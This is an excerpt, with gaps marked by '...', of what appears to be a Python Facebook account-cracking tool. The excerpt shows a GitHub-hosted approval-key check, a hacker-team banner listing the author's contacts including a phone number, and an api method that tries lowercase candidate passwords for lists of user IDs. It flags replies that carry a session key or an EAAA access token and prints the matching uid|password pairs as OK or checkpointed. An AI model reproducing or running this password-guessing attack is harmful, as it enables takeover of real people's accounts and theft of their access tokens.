...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://github.com/HRIDOY-CHOWDURY-RAIHAN/approval.txt/blob/main/Ap.txt"])
	exit(" [*] FACEBOOK :  HRIDOY CHOWDURY RAIHAN")
...
def notice():
	...
	runtxt("\033[0;92m ADMIN MESSENGER🔰RAIHAN")
	subprocess.check_output(["am", "start", "https://www.facebook.com/paglir.pagol.37853"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://github.com/HRIDOY-CHOWDURY-RAIHAN/RAIHAN/blob/main/RAIHAN.txt').text
			if basesplit in plr:
				key = basesplit
...
\033[1;90m══════════════════════════════════════════════════
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFACEBOOK : HRIDOY CHOWDURY RAIHAN  
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFB GROUP : B-HACKER 2.0 TEAM 
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mGITHUB   : HRIDOY-CHOWDURY-RAIHAN
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mWhatsapp  : 01948561429
\033[1;90m══════════════════════════════════════════════════
    """)
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [RAIHAN_OLD] : %s/%s -> \033[0;92m [ RAIHAN-OK:%s ]- \033[0;91m[RAIHAN-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r \033[0;91m[RAIHAN-CP] %s|%s\033[0;97m         "%(uid, pw))
